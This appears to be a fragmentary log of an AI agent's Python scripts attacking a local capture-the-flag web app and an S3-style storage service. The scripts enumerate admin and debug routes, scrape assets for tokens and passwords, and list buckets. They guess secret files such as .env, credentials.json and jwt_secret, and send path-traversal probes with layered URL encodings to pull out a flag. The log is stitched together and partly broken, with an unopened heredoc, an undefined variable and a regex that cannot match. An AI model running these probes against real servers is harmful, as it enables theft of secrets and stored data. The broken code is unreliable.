import requests, hashlib, re, time
base='http://127.0.0.1:9101'
paths=['/','/robots.txt','/api','/admin','/debug','/healthz','/login','/login.php','/search','/search.php','/.git/HEAD','/backup','/sitemap.xml','/register','/signup','/profile','/dashboard','/static/app.js','/assets/app.js']
s=requests.Session()
for p in paths:
    try:
        r=s.get(base+p,timeout=5,allow_redirects=False)
        body=r.text
        print(f'=== GET {p} ===')
        print('status',r.status_code,'len',len(r.content),'sha',hashlib.sha256(r.content).hexdigest()[:12])
        print('headers', {k:v for k,v in r.headers.items() if k.lower() in ['server','x-powered-by','set-cookie','location','content-type']})
        print(body[:1000].replace('\n','\\n'))
    except Exception as e: print('ERR',p,e)

$ python3 - <<'PY'
import requests,re,html,hashlib,json
from urllib.parse import urljoin,urlparse
base='http://127.0.0.1:9101'
s=requests.Session()
r=s.get(base+'/',timeout=10)
print('HOME status',r.status_code,'len',len(r.text))
text=r.text
for pat,name in [(r'href="([^"]+)"','href'),(r'src="([^"]+)"','src'),(r'<form[^>]*','form'),(r'action="([^"]+)"','action')]:
    vals=re.findall(pat,text,re.I)
    print('---',name,len(vals),'---')
    for v in vals[:100]: print(v[:300])
scripts=[urljoin(base,u) for u in re.findall(r'<script[^>]+src="([^"]+)"',text)]
links=[urljoin(base,u) for u in re.findall(r'<link[^>]+href="([^"]+)"',text)]
print('SCRIPTS',len(scripts))
for u in scripts+links:
    if 'static' not in u: continue
    try:
        rr=s.get(u,timeout=10)
        print('\n=== ASSET',u,'status',rr.status_code,'len',len(rr.text),'sha',hashlib.sha256(rr.content).hexdigest()[:12],'ctype',rr.headers.get('content-type'))
        content=rr.text
        # URLs/interesting literals
        hits=[]
        for m in re.finditer(r'(?:(?:https?://|/)[A-Za-z0-9_./?=&%#:-]+|[A-Za-z0-9_/-]+\.(?:php|json|html)|fetch\(|XMLHttpRequest|axios|\.action|api|admin|flag|Mana|pool|user|role|token)',content):
            val=m.group(0)
            if len(val)>1: hits.append(val)
        seen=[]
        for h in hits:
            if h not in seen: seen.append(h)
        for h in seen[:120]: print(h)
    except Exception as e: print('asset err',u,e)
PY

python3 - <<'PY'
import requests,re,hashlib,json
from urllib.parse import urljoin
base='http://127.0.0.1:9101'
s=requests.Session()
# gather routes pages and chunks
pages=['/','/team']
assets=set()
for p in pages:
    r=s.get(base+p,timeout=10)
    print('PAGE',p,'len',len(r.text))
    for word in ['admin','login','flag','role','secret','api','s3','team','user','Mana']:
        if word.lower() in r.text.lower(): print(' contains',word)
    for src in re.findall(r'(?:src|href)="([^"]+)"',r.text):
        if src.startswith('/_next/'): assets.add(urljoin(base,src))
    # print Next data snippets around self.__next_f
    for m in re.finditer(r'self\.__next_f\.push\(\[1,"(.*?)"\]\)',r.text):
        snippet=m.group(1)
        if any(x in snippet.lower() for x in ['api','admin','flag','role','user','team','s3']):
            print('NEXTF',snippet[:1000])
for u in sorted(assets):
    rr=s.get(u,timeout=10)
    txt=rr.text
    print('\nASSET',u.split(base)[-1],'len',len(txt),'sha',hashlib.sha256(rr.content).hexdigest()[:12])
    # show page chunks fully if small
    if len(txt)<5000:
        print(txt[:5000])
    else:
        for term in ['api','s3','admin','flag','role','login','user','team','fetch','axios','password','jwt','cookie']:
            low=txt.lower(); idx=low.find(term)
            if idx!=-1:
                print('--- around',term,'---')
                print(txt[max(0,idx-300):idx+500])

import requests,re,xml.etree.ElementTree as ET,sys
base='http://127.0.0.1:9301'
for bucket in ['assets','backups']:
    for url in [f'{base}/{bucket}', f'{base}/{bucket}?list-type=2', f'{base}/{bucket}?prefix=']:
        r=requests.get(url,timeout=5)
        print('\nURL',url,'status',r.status_code,'ctype',r.headers.get('content-type'),'len',len(r.content))
        print(r.text[:5000])
        if 'flag{' in r.text.lower(): sys.exit(0)
    # Parse keys from list and fetch all
    r=requests.get(f'{base}/{bucket}?list-type=2',timeout=5)
    keys=re.findall(r'<Key>(.*?)</Key>',r.text)
    print('KEYS',bucket,keys)
    for k in keys:
        rr=requests.get(f'{base}/{bucket}/'+requests.utils.quote(k,safe='/'),timeout=5)
        print('\nOBJ',bucket,k,'status',rr.status_code,'len',len(rr.content),'ctype',rr.headers.get('content-type'))
        txt=rr.content.decode('utf-8','replace')
        print(txt[:3000])
        m=re.search(r'flag\{[^}]+\}',txt,re.I)
        if m:
            print('FOUND_FLAG',m.group(0)); sys.exit(0)

--- iter 42 bash ---
$ python3 - <<'PY'
import requests,re,sys
base='http://127.0.0.1:9301'
r=requests.get(base+'/backups?list-type=2',timeout=5)
print('LIST status',r.status_code,'len',len(r.content))
print(r.text)
keys=re.findall(r'<Key>(.*?)</Key>',r.text)
for k in keys:
    rr=requests.get(base+'/backups/'+requests.utils.quote(k,safe='/'),timeout=5)
    print('\nOBJ',k,'status',rr.status_code,'len',len(rr.content),'ctype',rr.headers.get('content-type'))
    txt=rr.content.decode('utf-8','replace')
    print(txt)
    m=re.search(r'flag\{[^}]+\}',txt,re.I)
    if m:
        print('FOUND_FLAG',m.group(0)); sys.exit(0)
PY

import requests,re,itertools,hashlib,sys,string
base='http://127.0.0.1:9301'
known_buckets=['assets','backups']
bucket_guesses=known_buckets+['flag','flags','secret','secrets','private','internal','config','configs','env','backup','db','data','admin','master','manapool','app','source','src','uploads']
key_guesses=['flag','flag.txt','FLAG','FLAG.txt','.flag','secret','secret.txt','.env','env','config.json','credentials.json','creds.json','jwt_secret','jwt_secret.txt','admin.txt','master.txt','manapool.db','users.db','database.db','db.sqlite','dump.sql','backup.sql','source.zip','backup.zip']
# 1) enumerate bucket metadata/listing variants
for b in bucket_guesses:
    for q in ['', '?list-type=2', '?versions', '?uploads', '?delimiter=/', '?prefix=', '?prefix=../', '?prefix=..%2f']:
        url=f'{base}/{b}{q}'
        try: r=requests.get(url,timeout=4,allow_redirects=False)
        except Exception: continue
        txt=r.content.decode('utf-8','replace')
        if r.status_code not in (404,403) or 'flag{' in txt.lower():
            print('\\n=== LIST',url,'status',r.status_code,'len',len(r.content),'ctype',r.headers.get('content-type'),'sha',hashlib.sha256(r.content).hexdigest()[:12],'===')

            if m: sys.exit(0)
# 2) direct + traversal key probes from every guessed/known bucket
for b,k in itertools.product(bucket_guesses,key_guesses):
    rels=[k,'../'+k,'../backups/'+k,'../assets/'+k,'../../'+k]
    for rel in rels:
        encs={rel,rel.replace('/','%2f'),rel.replace('/','%252f'),rel.replace('.','%2e').replace('/','%2f')}
        for enc in encs:
            url=f'{base}/{b}/{enc}'
            try: r=requests.get(url,timeout=4,allow_redirects=False)
            except Exception: continue
            txt=r.content.decode('utf-8','replace')
            noise=(r.status_code==404 and ('NoSuchKey' in txt or 'NoSuchBucket' in txt)) or r.status_code in (400,403)
            if (not noise) or 'flag{' in txt.lower():
                print('\\n=== OBJ',url,'status',r.status_code,'len',len(r.content),'ctype',r.headers.get('content-type'),'sha',hashlib.sha256(r.content).hexdigest()[:12],'===')
                print(txt if len(txt)<20000 else txt[:20000])
                m=re.search(r'flag\\{[^}]+\\}',txt,re.I)
                if m: sys.exit(0)
